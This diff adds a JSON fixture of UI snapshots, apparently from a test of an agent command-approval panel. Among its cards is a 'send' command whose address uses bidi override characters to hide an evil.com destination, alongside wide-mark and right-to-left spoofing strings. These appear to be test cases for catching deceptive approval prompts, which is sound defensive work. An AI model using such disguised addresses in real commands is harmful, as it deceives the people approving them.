@@ -1,0 +1,188 @@
+{
+  "snapshots": [
+    {
+      "label": "before",
+      "time": 23723.400000000023,
+      "focus": "<textarea aria-label=\"Message\" placeholder=\"What would you like to work on?\" rows=\"2\"></textarea>",
+      "rows": []
+    },
+    {
+      "label": "opened",
+      "time": 23823.5,
+      "focus": "<textarea aria-label=\"Message\" placeholder=\"What would you like to work on?\" rows=\"2\"></textarea>",
+      "rows": []
+    },
+    {
+      "label": "3.5s",
+      "time": 27327.100000000093,
+      "focus": "<body>\n    <div id=\"root\"><div class=\"desktop-window-under\"><div class=\"workspace-window\" data-rail=\"off\" data-host=\"macos\" data-surface=\"window\" data-desktop-theme=\"graphite\" data-sidebar=\"open\" style=\"--rail-width: 64px; --workspace-panel-width: 360px;\"><div class=\"desktop-ambient\" aria-hidden=\"true\"><span class=\"desktop-grain\"></span></div><div class=\"workspace-titlebar\" data-tauri-drag-region=\"true\"><div class=\"workspace-titlebar-controls\" data-tauri-drag-region=\"true\"><div class=\"workspace-titlebar-navigation\"><button type=\"button\" class=\"desktop-icon-button\" data-size=\"md\" data-shape=\"rounded\" data-tone=\"muted\" aria-label=\"Hide Sidebar ",
+      "overview": "AgentsOngoing8 need you · 5 workingNeeds youRetry budget for ACP reconnectsRuns the reconnect tests, including the new budget-exhaustion case.cargo test -p gateway reconnect3mDenyAllow OnceAlways AllowRelease build signing fails on CIImports a signing certificate into the release keychain.security import build/certificates/nessa-developer-id-application-2026-10.p12 -k release.keychain4mDenyAllow OnceAlways AllowRetry budget for ACP reconnectsCodex · GPT-6 Astra · #gatewayOpenWaiting for you3mWaiting to run the reconnect tests after adding a token bucketReconnects to the ACP harness hammer the gateway after a restart. Give them a retry budget.Earlier in this turn · OpenRan 6 tools2 earlierReadacp/tests/reconnect.rsEditedacp/tests/reconnect.rs38 additions, 4 deletions+38-4Readacp/tests/support.rsEditedacp/tests/support.rs12 additions, 2 deletions+12-2Fifty simulated clients are enough to reproduce it: the accept queue peaks at 4,100 pending handshakes. I've added a failing test for a budget that runs out.#[tokio::test]\nasync fn gives_up_once_the_budget_is_spent() {\n    let client = storm_client(Budget::new(5, secs(2)));\n    assert!(matches!(client.reconnect().await, Err(ReconnectError::BudgetExhausted)));\n}Ran 3 toolsReadacp/reconnect.rsReadacp/backoff.rsEditedacp/backoff.rs22 additions, 9 deletions+22-9The test fails as it should. I've given each client a token bucket — five att",
+      "rows": [
+        {
+          "id": "retry-budget",
+          "tab": "0",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 218,
+            "width": 512,
+            "height": 83,
+            "top": 218,
+            "right": 796,
+            "bottom": 301,
+            "left": 284
+          }
+        },
+        {
+          "id": "signing",
+          "tab": "-1",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 301,
+            "width": 512,
+            "height": 83,
+            "top": 301,
+            "right": 796,
+            "bottom": 384,
+            "left": 284
+          }
+        }
+      ]
+    },
+    {
+      "label": "7s",
+      "time": 30835.300000000047,
+      "focus": "<div class=\"agents-request\" data-overview-item=\"retry-budget\" role=\"group\" tabindex=\"0\" aria-label=\"Retry budget for ACP reconnects. Codex wants to run cargo test -p gateway reconnect.\" data-offers-always=\"true\" data-selected=\"true\" aria-expanded=\"false\"><span class=\"workspace-agent-tile\" data-agent=\"codex\" style=\"width: 24px; height: 24px; font-size: 12px;\"><svg aria-hidden=\"true\" viewBox=\"0 0 24 24\" width=\"1em\" height=\"1em\" fill-rule=\"evenodd\" class=\"size-5 shrink-0\"><path d=\"M9.205 8.658v-2.26c0-.19.072-.333.238-.428l4.543-2.616c.619-.357 1.356-.523 2.117-.523 2.854 0 4.662 2.212 4.662 4.566 0 .167 0 .357-.024.547l-4.71-2.759a.797.797 0 00",
+      "overview": "AgentsOngoing8 need you · 5 workingNeeds youRetry budget for ACP reconnectsRuns the reconnect tests, including the new budget-exhaustion case.cargo test -p gateway reconnect3mDenyAllow OnceAlways AllowRelease build signing fails on CIImports a signing certificate into the release keychain.security import build/certificates/nessa-developer-id-application-2026-10.p12 -k release.keychain4mDenyAllow OnceAlways AllowNotarize the macOS buildUploads the signed build to Apple for notarization. This uses the release keychain profile.xcrun notarytool submit Nessa_0.9.0_aarch64.dmg --keychain-profile nessa --wait6mDenyAllow OnceAlways AllowMarks wider than the cardLists the folders named in the command.ls ؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀؀~ ᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀᄀ가ᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡᅡ~ xाााााााााााााााााााााााााााााााााााााााा~8mDenyAllow OnceAlways AllowShell through the lab's toolStarts the local gateway through the lab's shell tool.mcp__nessa_gateway_lab__simulated_shell {\"command\":\"cargo run -p gateway\"}9mDenyAllow OnceAlways AllowCommand base directionRuns the tool named in the command, then its argument.שלום {\"to\":\"bob@example.com\"}10mDenyAllow OnceAlways AllowCommand drawn in orderSends the note to the address in the argument.send {\"to\":\"\\u2028\\u202emoc.live@bob\\u202c\\u2029\"}11mDenyAllow OnceAlways AllowReconnect storm after sleepRestarts the local gateway and opens 200 connectio",
+      "rows": [
+        {
+          "id": "retry-budget",
+          "tab": "0",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 218,
+            "width": 512,
+            "height": 83,
+            "top": 218,
+            "right": 796,
+            "bottom": 301,
+            "left": 284
+          }
+        },
+        {
+          "id": "signing",
+          "tab": "-1",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 301,
+            "width": 512,
+            "height": 83,
+            "top": 301,
+            "right": 796,
+            "bottom": 384,
+            "left": 284
+          }
+        },
+        {
+          "id": "notarize",
+          "tab": "-1",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 384,
+            "width": 512,
+            "height": 83,
+            "top": 384,
+            "right": 796,
+            "bottom": 467,
+            "left": 284
+          }
+        },
+        {
+          "id": "wide-marks",
+          "tab": "-1",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 467,
+            "width": 512,
+            "height": 83,
+            "top": 467,
+            "right": 796,
+            "bottom": 550,
+            "left": 284
+          }
+        },
+        {
+          "id": "lab-shell",
+          "tab": "-1",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 550,
+            "width": 512,
+            "height": 83,
+            "top": 550,
+            "right": 796,
+            "bottom": 633,
+            "left": 284
+          }
+        },
+        {
+          "id": "command-order-rtl",
+          "tab": "-1",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 633,
+            "width": 512,
+            "height": 83,
+            "top": 633,
+            "right": 796,
+            "bottom": 716,
+            "left": 284
+          }
+        },
+        {
+          "id": "command-order",
+          "tab": "-1",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 716,
+            "width": 512,
+            "height": 83,
+            "top": 716,
+            "right": 796,
+            "bottom": 799,
+            "left": 284
+          }
+        },
+        {
+          "id": "reconnect-storm",
+          "tab": "-1",
+          "inert": false,
+          "rect": {
+            "x": 284,
+            "y": 799,
+            "width": 512,
+            "height": 83,
+            "top": 799,
+            "right": 796,
+            "bottom": 882,
+            "left": 284
+          }
+        }
+      ]
+    }
+  ],
+  "focus": [
+    {
+      "time": 27624.70000000007,
+      "target": "<div class=\"agents-request\" data-overview-item=\"retry-budget\" role=\"group\" tabindex=\"0\" aria-label=\"Retry budget for ACP reconnects. Codex wants to run cargo test -p gateway reconnect.\" data-offers-always=\"true\" data-selected=\"true\" aria-expanded=\"false\"><span class=\"workspace-agent-tile\" data-agent=\"codex\" style=\"width: 24px; height: 24px; font-size: 12px;\"><svg aria-hidden=\"true\" viewBox=\"0 0 24 24\" width=\"1em\" height=\"1em\" fill-rule=\"evenodd\" class=\"size-5 shrink-0\"><path d=\"M9.205 8.658v-2.2"
+    }
+  ]
+}
